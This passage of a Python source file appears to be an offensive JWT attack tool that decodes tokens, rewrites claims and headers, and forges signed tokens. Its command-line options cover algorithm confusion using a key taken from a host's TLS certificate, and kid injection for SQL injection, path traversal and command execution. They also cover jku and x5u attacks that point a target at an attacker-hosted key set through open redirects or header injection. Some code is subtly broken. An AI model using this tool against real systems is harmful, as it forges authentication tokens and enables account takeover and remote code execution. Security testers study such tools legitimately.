        :param token: A JWT -> str.

        Creates a regex pattern and looks if the token match it.

        :return: True, if the token match the pattern, False if not.
        """
        token_pattern = r"^.+\..+\..*$"
        match = re.match(token_pattern, token)
        if match:
            return True
        else:
            return False

    @staticmethod
    def dictionarize_token(token):
        """
        A method that stores in a dict the three part ok a JWT.

        :param token: A JWT -> str.

        Splits the token in three part (header, payload, signature) and creates a dict with thees data.

        :return: The created dict object
        """
        token_list = token.split(".")
        if len(token_list) < 3:
            token_list.append("")
        token_dict = dict(header=token_list[0], payload=token_list[1], signature=token_list[2])
        return token_dict

    @staticmethod
    def append_equals_if_needed(string):
        """
        Corrects a string that is intended to be base64 decoded.

        :param string: A string, base64 encoded part of a JWT -> str.

         Since JWT are base64 encoded but the equals signs are stripped, this function appends them to the
         string given as input, only if necessary.

         If the string can't be decoded after the second equal sign has been appended, it returns an error.

        :return: A byte-string ready to be base64 decoded.
        """
        encoded = string.encode()
        final_text = b""
        i = 0
        while not final_text:
            try:
                decoded = base64.urlsafe_b64decode(encoded)
                final_text = encoded
                return final_text
            except binascii.Error:
                if i == 2:
                    print(f"{Bcolors.FAIL}jwtcrk: err: Seems like the token is not base64 encoded or simply invalid{Bcolors.ENDC}")
                encoded += b'='
                i += 1

    @staticmethod
    def url_escape(string, chars, spaces=True):
        """
        :param string: The string to url encode -> str
        :param chars: The only characters to encode in the string -> str
        :param spaces: If true automatically appends a space to the chars parameter -> Bool

        The function, given a string, replaces characters specified in the chars parameter with their url encoded one.
        By default, if the space character is not specified in the chars parameter, the function automatically appends it.

        :return: The original string with the specified characters url encoded
        """
        if " " not in chars and spaces:
            chars += " "
        encoded = [urllib.parse.quote(char) for char in chars]
        for i in range(len(chars)):
            string = string.replace(chars[i], encoded[i])
        return string

    @staticmethod
    def decode_encoded_token(iterable):
        """
        :param iterable: A dict object populated with the three parts of a JWT -> dict.

        This function simply take the header and the payload from a dictionary created with dictionarize_token, passes
        them to append_equals_if_needed and decodes them.

        :return: The decoded header, and the decoded payload as strings.
        """
        if iterable['header'] is None or iterable['payload'] is None:
            print(f"{Bcolors.OKBLUE}Please pass the token dict as parameter{Bcolors.ENDC}")
        header_b64 = Cracker.append_equals_if_needed(iterable["header"])
        payload_b64 = Cracker.append_equals_if_needed(iterable["payload"])
        try:
            header_ = base64.urlsafe_b64decode(header_b64).decode('utf-8')
            payload_ = base64.urlsafe_b64decode(payload_b64).decode('utf-8')
        except UnicodeDecodeError:
            print(f"{Bcolors.FAIL}jwtcrk: err: Decoding Error. Please be sure to pass a valid jwt{Bcolors.ENDC}")
            sys.exit(2)
        return header_, payload_

    @staticmethod
    def change_payload(user_input, iterable):
        """
        :param user_input: A key:value string -> str.
        :param iterable: A dict object representing the original decoded payload of the JWT -> dict.

        Given a string with this 'name:value' format, splits it, look for a <name> key in the iterable and, if it's,
        change its value to <value>. If it doesn't find <name> in the iterable's keys, print an error and quits out.

        :return: The dictionary with the changes done.
        """
        try:
            new_payload = user_input.split(":")
            new_payload_key = new_payload[0]
            new_payload_value = Cracker.build_values(new_payload[1])
        except IndexError:
            print(f"{Bcolors.FAIL}jwtcrk: err: Payload must have this syntax: name:value. You have written '{user_input}'{Bcolors.ENDC}")
            sys.exit(2)
        if new_payload_key not in iterable.keys():
            print(f"{Bcolors.WARNING}jwtcrk: warn: can't find {new_payload_key} in the token payload. It will be added{Bcolors.ENDC}")
        iterable[new_payload_key] = new_payload_value
        return iterable

    @staticmethod
    def delete_key(iterable, key):
        """
        :param iterable: The header dictionary or the payload one -> dict
        :param key: The key to delete from the dictionary -> str

        The function first checks that the specified key exists in the dictionary, else returns an error and quits out.
        If the key exists, it delete the related item from the dictionary.

        :return: The modified dictionary
        """
        if key not in iterable.keys():
            print(f"{Bcolors.FAIL}The key {key} does not exists in the specified section{Bcolors.ENDC}")
            sys.exit(2)
        del iterable[key]
        return iterable

    @staticmethod
    def add_key(iterable, key):
        """
        :param iterable: The header dictonary or the payload one -> dict
        :param key: The key to insert into the dictonary -> str

        The function first check that the specified key does not already exists in the dictonary, else returns an error and
        quits out. If the key does not exists, it adds the new items with a default value.

        :return: The modified dictonary
        """
        if key in iterable.keys():
            print(f"{Bcolors.FAIL}jwtcrk: err: You are trying to add a key that already exists{Bcolors.ENDC}")
            sys.exit(2)
        iterable[key] = "default"
        return iterable

    @staticmethod
    def encode_token_segment(json_string):
        """
        :param json_string. A json string representing the header or the payload -> str.

        Pretty self explanatory...

        :return: The base64 encoded string, so one part of the final token.
        """
        encoded_new_segment_bytes = base64.urlsafe_b64encode(json_string.encode("utf-8"))
        encoded_new_segment_string = str(encoded_new_segment_bytes, 'utf-8').rstrip("=")
        return encoded_new_segment_string

    @staticmethod
    def craft_token(header_, payload_):
        """
        :param header_: The json string representing the header -> str
        :param payload_: The json string representing the payload -> str

        Calls encode_token_segment on header_ and payload_ and then sum them.

        :return: The encoded header + the encoded payload as string separated by a dot. The firsts two part of a JWT.
        """
        encoded_header = Cracker.encode_token_segment(header_)
        encoded_payload = Cracker.encode_token_segment(payload_)
        return encoded_header + "." + encoded_payload

    @staticmethod
    def build_keys(string):
        """
        Build a list of keys
        :param string: A string containing the kyes, separated by ',' -> str

        The function first check for the separator, and quits out if is not present. Then split the string and check for
        integers ones.

        :return: The list of keys, or None if separator is not present in string
        """
        if "," not in string:
            return None
        keys = string.split(",")
        for i in range(len(keys)):
            try:
                keys[i] = int(keys[i])
            except ValueError:
                continue
        return keys

    @staticmethod
    def build_values(string):
        """
        Build a list of values
        :param string: A string containig one value, or a list of them separated by commas -> str

        If at least one comma is present in the string, the function splits it by commas. Then it checks in the returned
        list, if any empy string exists and, case it is, deletes them.

        :return: The values list, if string contained values comma separated, else the string itself.
        """
        if "," in string:
            values = string.split(",")
            for i in len(values):
                if values[i] == "":
                    values.remove(values[i])
            return values
        return string

    @staticmethod
    def change_payload_complex(string, iterable):
        """
        :param string: A key:value pair where key is a set of keys and value a set of values or a single one -> str
        :param iterable: The payload dictionary -> dict

        The function calls build_keys and build_values, passing them the rith part of the string (splitted by ':').
        Then it iterates trough the keys list builing the path to iterable item to be changed. When the item
        has been accessed (the last iteration in the keys list), it assign it the value generated by build_vals

        :return: The modified payload dictionary
        """
        keys = Cracker.build_keys(string.split(":")[0].strip(","))
        vals = Cracker.build_values(string.split(":")[1].lstrip(","))
        if keys is None:
            print(f"{Bcolors.FAIL}jwt: err: Can't split keys basing on ','. If you can access the claim using a single key, pleas use --payload{Bcolors.ENDC}")
            sys.exit(2)
        i = 0
        for key in keys:
            try:
                if i == 0:
                    keys_path = iterable[key]
                else:
                    if i == len(keys) -1:
                        keys_path[key] = vals
                        break
                    keys_path = keys_path[key]
                i += 1
            except (KeyError, TypeError):
                print(f"{Bcolors.FAIL}jwtcrk: err: Key '{key}' is not present in payload{Bcolors.ENDC}")
                sys.exit(2)
        return iterable

    @staticmethod
    def get_key_from_ssl_cert(hostname):
        """
        :param hostname. The hostname of which you want to retrieve the cert -> str

        First open devnull to redirect stdin, stdout or stderr if necessary, and defines a regex pattern to match the output of
        our first command. Then defines the command that we need to retrieve an ssl cert, launches it with subprocess and handle
        enventual errors. At this points, the function uses regex to grab the content that wee need, and writes that content in a
        file (cert.pem). Then defines the second command, and launches it. Since this command should have no output, if we have,
        breaks out and returns an error. Else stores the path for the generated key, and closes devnull.

        :retrun the path to the generated key.
        """
        devnull_ = open(os.devnull, 'wb')
        pattern = r'(?:Server\scertificate\s)((.|\n)*?)subject='
        """Get cert.pem"""
        first_command = f"openssl s_client -connect {hostname}:443"
        try:
            first_command_output = subprocess.check_output(
                first_command, shell=True, stdin=devnull_, stderr=devnull_
            ).decode('utf-8')
        except subprocess.CalledProcessError:
            print(
                f"{Bcolors.FAIL}jwtcrk: err: Can't openssl s_client can't connect with {hostname}. Please make sure to type correctly{Bcolors.ENDC}"
            )
            sys.exit(2)
        cert = re.findall(pattern, first_command_output)[0][0].rstrip("\n")
        """Write cert.pem"""
        with open("cert.pem", 'w') as file:
            file.write(cert)
        """Extract key.pem"""
        second_command = "openssl x509 -in cert.pem -pubkey -noout > key.pem"
        second_command_output = subprocess.check_output(
            second_command, shell=True, stdin=devnull_, stderr=subprocess.STDOUT
        )
        if second_command_output:
            print(f"{Bcolors.FAIL}jwtcrk: err: Maybe the cert is not valid{Bcolors.ENDC}")
            sys.exit(2)
        key = f"{os.getcwd()}/key.pem"
        devnull_.close()
        return key

    @staticmethod
    def generate_jwk(n, e, kid):
        """
        Generation of a jwk claim

        :param n: The modulus of the public key -> str
        :param e: The exponent of the publc key -> str
        :param kid: The key identifier -> str

        :return: The generated jwk
        """
        jwk = dict()
        jwk['kty'] = "RSA"
        jwk['kid'] = kid
        jwk['use'] = "sig"
        jwk['n'] = n
        jwk['e'] = e
        return jwk

    @staticmethod
    def embed_jwk_in_jwt_header(iterable, jwk):
        """
        :param iterable: The header dictionary -> dict
        :param jwk: The jwk to insert into iterable -> dict

        :return: The modified header dictionary
        """
        iterable['jwk'] = jwk
        return iterable

    def run(self):
        """
        The function to run the attack.

        This function will run after main conflicts has already been solved, and call methods that already know which attack to run.
        First, if self.decode is True, run self.decode_and_quit, so the script will quits here. If we goes on, we know that self.alg
        must not be None, if it's quits out.
        Else crafts the token header and payload, signs them and generates the final token. Than prints the final token to stdout and
        checks for open files to close.
        """
        if self.decode:
            self.decode_and_quit()
        if self.alg is None:
            print(f"{Bcolors.FAIL}jwtcrk: err: Missing --alg. You can mess it up only if you are decoding a jwt{Bcolors.ENDC}")
            sys.exit(2)
        header, payload = self.modify_header_and_payload()
        new_partial_token = Cracker.craft_token(header, payload)
        signature = self.select_signature(new_partial_token)
        final_token = new_partial_token + "." + signature
        print(f"{Bcolors.HEADER}Crafted header ={Bcolors.ENDC} {Bcolors.OKCYAN}{header}{Bcolors.ENDC}, {Bcolors.HEADER}Crafted payload ={Bcolors.ENDC} {Bcolors.OKCYAN}{payload}{Bcolors.ENDC}")
        print(f"{Bcolors.BOLD}{Bcolors.HEADER}Final Token:{Bcolors.ENDC} {Bcolors.BOLD}{Bcolors.OKBLUE}{final_token}{Bcolors.ENDC}")
        if self.file is not None:
            self.file.close()
        if os.path.exists("key.pem"):
            os.remove("key.pem")
        if os.path.exists("cert.pem"):
            os.remove("cert.pem")
        if os.path.exists("testing.crt"):
            os.remove("testing.crt")
        self.devnull.close()
        sys.exit(0)


if __name__ == '__main__':

    # Initialize the parser
    parser = argparse.ArgumentParser(
        usage=Cracker.usage,
        description=Cracker.description,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Add the arguments
    parser.add_argument(
                        "token",
                        help="Your JWT",
                        default=sys.stdin if sys.stdin.isatty() else None
                        )
    parser.add_argument("-a", "--alg",
                        help="The algorithm for the attack (None, none, HS256, RS256)",
                        metavar="<algorithm>", required=False
                        )
    parser.add_argument("-k", "--key",
                        help="The path to the key file",
                        metavar="<path_to_key>", required=False
                        )
    parser.add_argument("-p", "--payload",
                        action="append", nargs="+",
                        help="A claim you want to change in the payload and the value to issue, as key:value pairs. If value have to be a list, pass list items as comma separated values.",
                        metavar="<key>:<value>", required=False
                        )
    parser.add_argument("-d", "--decode", action="store_true",
                        help="Just decode the token and quit",
                        required=False
                        )
    parser.add_argument("--complex-payload", action="append", nargs="+",
                        help="As --payload but for subclaims. Keys must be comma separated, and passed in cronological order. If value have to be a list, pass the list items as comma separated values",
                        metavar="<key,key...>:<value>", required=False
                        )
    parser.add_argument("--remove-from", action="append", nargs="+",
                        help="The section of the token and the key of the item to delete, as key:value pairs",
                        metavar="<section>:<key>", required=False,
                        )
    parser.add_argument("--add-into", action="append", nargs="+",
                        help="The section of the token and the key of the item to add as key:value pairs",
                        metavar="<section>:<key>", required=False
                        )
    parser.add_argument("--unverified", action="store_true",
                        help="Server does not verify the signature",
                        required=False
                        )
    parser.add_argument("--auto-try",
                        help="Retrieve public key from the host ssl cert",
                        metavar="<domain>", required=False
                        )
    parser.add_argument("--inject-kid",
                        help="The payload to inject in the kid header (SQLi, DirTrv, RCE)",
                        metavar="<payload>", required=False
                        )
    parser.add_argument("--exec-via-kid",
                        help="A system command to be injected in the kid (if default RCE does not work)",
                        metavar="<command>", required=False
                        )
    parser.add_argument("--specify-key",
                        help="A string to be used as password for sign the token", metavar="<key>",
                        required=False
                        )
    parser.add_argument("--jku-basic",
                        help="The ip/domain where you will host the jwks file. '/.well-known/jwks.json' is automatically appended",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--jku-redirect",
                        help="The url vulnerable to Open Redirect and your one, as comma separated values. Replace the redirect url with the HERE keyword. './well-known/jwks.json' is automatically appended to your url",
                        metavar="<mainURL,yourURL>", required=False
                        )
    parser.add_argument("--jku-inbody",
                        help="The url vulnerable to HTTP header injection and your one, as comma separated values. Append the HERE keyword to the vulnerable parameter of the url query string. './well-known/jwks.json' is automatically appended to your url",
                        metavar="<mainURL>", required=False
                        )
    parser.add_argument("--x5u-basic",
                        help="The ip/domain where you will host the jwks.json file. '/.well-known/jwks.json' is automatically appended",
                        metavar="<yourURL>", required=False
                        )
    parser.add_argument("--x5u-inbody",
                        help="The url vulnerable to HTTP header injection and your one, as comma separated values. Append the HERE keyword to the vulnerable parameter of the url query string './well-known/jwks.json' is automatically appended to your url",
                        metavar="<mainURL>", required=False
                        )
    parser.add_argument("--manual", action="store_true",
                        help="Tool won't append '/.well-known/jwks.json' to your url. Use this flag only with --jku-basic and --x5u-basic",
                        required=False
                        )
    parser.add_argument("--generate-jwk", action="store_true",
                       help="Generate a jwk claim and insert it in the token header",
                       required=False
                        )

    # Parse arguments
    args = parser.parse_args()

    cracker = Cracker(
        args.token, args.alg, args.key, args.payload, args.complex_payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid,
        args.exec_via_kid, args.specify_key, args.jku_basic, args.jku_redirect, args.jku_inbody, args.x5u_basic, args.jku_inbody,
        args.unverified, args.decode, args.manual, args.generate_jwk,
    )

    # Start the cracker
    cracker.run()
